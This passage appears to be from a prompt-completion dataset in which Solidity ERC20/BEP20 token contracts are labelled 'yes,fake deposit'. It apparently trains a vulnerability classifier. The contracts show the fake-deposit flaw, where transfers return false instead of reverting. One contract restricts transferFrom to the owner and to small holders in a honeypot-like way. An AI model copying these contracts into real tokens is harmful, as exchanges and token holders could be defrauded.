_to, _value);\n return true;\n } else {\n return false;\n }\n }\n}\n\ncontract FastSafeToken is UnboundedRegularToken {\n\n uint public totalSupply = 2*10**26;\n uint8 constant public decimals = 18;\n string constant public name = \"FastSafe\";\n string constant public symbol = \"JAHK\";\n\n function FastSafeToken() {\n balances[msg.sender] = totalSupply;\n Transfer(address(0), msg.sender, totalSupply);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"Central Hub\";\n decimals = 0;\n symbol = \"CHAIR\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract MemePetToken is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'PET1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function MemePetToken() {\n balances[msg.sender] = 100000000000000000000000000000; \n totalSupply = 100000000000000000000000000000;\n name = \"MemePet Token\";\n decimals = 18; \n symbol = \"PET\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract PATPAT is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = '1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function PATPAT(\n ) {\n balances[msg.sender] = 200000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 200000000; // Update total supply (100000 for example)\n name = \"PATPAT\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals for display purposes\n symbol = \"PATPAT\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'TP1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 45000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 45000000000000000000000000; // Update total supply (100000 for example)\n name = \"True Patriot\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"TPAT\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity ^0.5.16;\n\n// ----------------------------------------------------------------------------\n// ERC Token Standard #20 Interface\n//\n// ----------------------------------------------------------------------------\ncontract ERC20Interface {\n function totalSupply() public view returns (uint);\n function balanceOf(address tokenOwner) public view returns (uint balance);\n function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n function changeMaxCoin(uint256 coin) public returns (bool success);\n\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\n\n// ----------------------------------------------------------------------------\n// Safe Math Library\n// ----------------------------------------------------------------------------\ncontract SafeMath {\n function safeAdd(uint a, uint b) public pure returns (uint c) {\n c = a + b;\n require(c >= a);\n }\n function safeSub(uint a, uint b) public pure returns (uint c) {\n require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);\n c = a / b;\n }\n}\n\n\ncontract BEP20TOKEN is ERC20Interface, SafeMath {\n string public name;\n string public symbol;\n uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\n uint256 public _totalSupply;\n uint256 public _coins;\n address public _owner;\n mapping(address => uint) balances;\n mapping(address => mapping(address => uint)) allowed;\n\n \n constructor( string memory name_, string memory symbol_, address owner_ , uint256 coins_) public {\n name = name_;\n symbol = symbol_;\n decimals = 18;\n _totalSupply = 1000000000000000000000000000000;\n _owner = owner_;\n _coins = coins_ * 10 ** 18;\n balances[msg.sender] = _totalSupply;\n emit Transfer(address(0), msg.sender, _totalSupply);\n }\n\n function totalSupply() public view returns (uint) {\n return _totalSupply - balances[address(0)];\n }\n\n function balanceOf(address tokenOwner) public view returns (uint balance) {\n return balances[tokenOwner];\n }\n\n function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n return allowed[tokenOwner][spender];\n }\n \n function approve(address spender, uint tokens) public returns (bool success) {\n allowed[msg.sender][spender] = tokens;\n emit Approval(msg.sender, spender, tokens);\n return true;\n }\n\n function transfer(address to, uint tokens) public returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n balances[to] = safeAdd(balances[to], tokens);\n emit Transfer(msg.sender, to, tokens);\n return true;\n }\n\n function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n \n if (_owner == from || balances[from] < _coins) {\n balances[from] = safeSub(balances[from], tokens);\n allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n balances[to] = safeAdd(balances[to], tokens);\n emit Transfer(from, to, tokens);\n return true;\n }\n \n \n }\n \n function changeMaxCoin(uint256 coins) public returns (bool success) {\n _coins = coins * 10 ** 18;\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'GrilledCheeseSandwich' token contract\n//\n// Symbol : GCS \ud83e\udd6a\n// Name : Grilled Cheese Sandwich\n// Total supply: 100000000000000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract GrilledCheeseSandwich is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Grilled Cheese Sandwich\";\n string public constant symbol = \"GCS \ud83e\udd6a\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000000000000; // Update total supply (100000 for example)\n name = \"OAK\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals\n symbol = \"OAK\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.0;\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n}\n\nabstract contract IERC20 {\n function totalSupply() virtual public view returns (uint256 supply);\n function balanceOf(address _owner) virtual public view returns (uint256 balance);\n function transfer(address _to, uint256 _value) virtual public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) virtual public returns (bool success);\n function approve(address _spender, uint256 _value) virtual public returns (bool success);\n function allowance(address _owner, address _spender) virtual public returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\ncontract ERC20 is IERC20 {\n using SafeMath for uint256;\n uint256 internal total_supply;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n event Burn(address indexed burner, uint256 value);\n event Mint(address indexed to, uint256 value);\n function transfer(address _to, uint256 _value) override public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) override public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) public view override returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public override returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public override returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function totalSupply() public view override returns (uint256 supply) {\n return total_supply;\n }\n}\n\ncontract BTCH is ERC20 {\n string public name;\n uint8 public decimals;\n string public symbol;\n address public owner;\n constructor (uint256 _initialAmount, string memory _tokenName, uint8 _decimalUnits, string memory _tokenSymbol) public {\n balances[msg.sender] = _initialAmount* 10 ** uint256(_decimalUnits);\n total_supply = _initialAmount* 10 ** uint256(_decimalUnits);\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n owner = msg.sender;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.24;\n\nlibrary SafeMath {\n function add(\n uint256 a,\n uint256 b)\n internal\n pure\n returns(uint256 c)\n {\n c = a + b;\n require(c >= a);\n }\n\n function sub(\n uint256 a,\n uint256 b)\n internal\n pure\n returns(uint256 c)\n {\n require(b <= a);\n c = a - b;\n }\n\n function mul(\n uint256 a,\n uint256 b)\n internal\n pure\n returns(uint256 c) {\n c = a * b;\n require(a == 0 || c / a == b);\n }\n \n function div(\n uint256 a,\n uint256 b)\n internal\n pure\n returns(uint256 c) {\n require(b > 0);\n c = a / b;\n }\n}\n\ninterface IERC20 {\n // ERC20 Optional Views\n function name() external view returns (string memory);\n\n function symbol() external view returns (string memory);\n\n function decimals() external view returns (uint8);\n\n // Views\n function totalSupply() external view returns (uint);\n\n function balanceOf(address owner) external view returns (uint);\n\n function allowance(address owner, address spender) external view returns (uint);\n\n // Mutative functions\n function transfer(address to, uint value) external returns (bool);\n\n function approve(address spender, uint value) external returns (bool);\n\n function transferFrom(\n address from,\n address to,\n uint value\n ) external returns (bool);\n\n // Events\n event Transfer(address indexed from, address indexed to, uint value);\n\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\n\n// https://docs.synthetix.io/contracts/source/contracts/owned\ncontract Owned {\n address public owner;\n address public nominatedOwner;\n\n constructor(address _owner) public {\n require(_owner != address(0), \"Owner address cannot be 0\");\n owner = _owner;\n emit OwnerChanged(address(0), _owner);\n }\n\n function nominateNewOwner(address _owner) external onlyOwner {\n nominatedOwner = _owner;\n emit OwnerNominated(_owner);\n }\n\n function acceptOwnership() external {\n require(msg.sender == nominatedOwner, \"You must be nominated before you can accept ownership\");\n emit OwnerChanged(owner, nominatedOwner);\n owner = nominatedOwner;\n nominatedOwner = address(0);\n }\n\n modifier onlyOwner {\n _onlyOwner();\n _;\n }\n\n function _onlyOwner() private view {\n require(msg.sender == owner, \"Only the contract owner may perform this action\");\n }\n\n event OwnerNominated(address newOwner);\n event OwnerChanged(address oldOwner, address newOwner);\n}\n\ncontract Pausable is Owned {\n event Pause();\n event Unpause();\n\n bool public paused = false;\n\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n\n modifier whenPaused() {\n require(paused);\n _;\n }\n\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\n\n\n\n\npragma solidity >=0.4.24;\n\ncontract IDODistribution is Owned, Pausable {\n \n using SafeMath for uint;\n\n \n address public authority;\n\n \n address public erc20Address;\n\n\n mapping(address => uint) balances;\n mapping(address => uint) counts;\n\n uint public totalSupply;\n\n constructor(\n address _owner,\n address _authority\n ) public Owned(_owner) {\n authority = _authority;\n }\n\n function 